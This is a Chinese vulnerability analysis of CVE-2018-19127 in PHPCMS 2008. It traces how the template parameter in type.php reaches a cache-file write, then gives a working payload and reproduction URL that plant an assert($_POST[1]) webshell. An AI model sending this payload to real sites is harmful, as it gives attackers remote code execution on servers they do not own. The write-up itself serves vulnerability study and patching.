<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2018-19127）Phpcms2008 Type.php代码注入漏洞</h1><h2>一、漏洞简介</h2><p>PHPCMS 2008存在的代码注入漏洞，导致攻击者可向网站上路径可控的缓存文件写入任意内容，从而可能获取webshell并执行任意指令。</p><h2>二、漏洞影响</h2><h2>三、复现过程</h2><h3>漏洞分析</h3><p>该漏洞源于PHPCMS 2008源码中的/type.php文件。该文件包含如下代码：</p><p>if(empty($template)) $template = 'type';<br />...<br />include template('phpcms', $template);</p><p>这里$template变量是用户能够通过传入参数控制的，同时可以看到该变量之后会被传入template()方法。而template()方法在/include/global.func.php文件中定义，包含如下代码：</p><p>template_compile($module, $template, $istag);</p><p>不难看出，这里会继续调用/include/template.func.php中的template_compile()：</p><p>function template_compile($module, $template, $istag = 0)<br />{<br />    ...<br />    $compiledtplfile = TPL_CACHEPATH.$module.'_'.$template.'.tpl.php';<br />    $content = ($istag || substr($template, 0, 4) == 'tag_') ? '&lt;?php function _tag_'.$module.'_'.$template.'($data, $number, $rows, $count, $page, $pages, $setting){ global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'.template_parse($content, 1).'&lt;?php } ?&gt;' : template_parse($content);<br />    $strlen = file_put_contents($compiledtplfile, $content);<br />    ...<br />}<br />`</p><p>在这个方法中，$template变量同时被用于$compiledtplfile中文件路径的生成，和$content中文件内容的生成。</p><p>而前文所述的攻击payload将$template变量被设置为如下的值</p><p>tag_(){};@unlink(_FILE_);assert($_POST[1]);{//../rss</p><p>所以在template_compile()方法中，调用file_put_contents()函数时的第一个参数就被写成了data/cache_template/phpcms_tag_(){};@unlink(_FILE_);assert($_POST[1]);{//../rss.tpl.php，这将被php解析成"data/cache_template/rss.tpl.php"。<br />最终，@unlink(_FILE_);assert($_POST[1]);将被写入该文件。</p><h3>漏洞复现</h3><p>当攻击者向安装有PHPCMS 2008的网站发送uri为如下文本的payload</p><p>https://www.0-sec.org/type.php?template=tag_(){};@unlink(_FILE_);assert($_POST[1]);{//../rss</p><p>那么@unlink(_FILE_);assert($_POST[1]);这句恶意php指令将被写入网站的/cache_template/rss.tpl.php文件。</p></body></html>